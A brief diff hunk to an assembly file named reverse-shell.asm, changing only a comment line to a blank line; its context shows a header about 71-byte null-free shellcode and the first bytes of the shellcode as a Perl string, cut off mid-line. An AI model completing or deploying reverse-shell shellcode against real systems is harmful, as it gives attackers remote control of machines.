@@ -3,7 +3,7 @@
 ;
 ; nasm -f bin reverse-shell.asm
 ; 71 Bytes with zero nulls or carriage returns
-;
+
 %comment
 my $sc =
 "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\x6a\x66\x58\xcd" . 
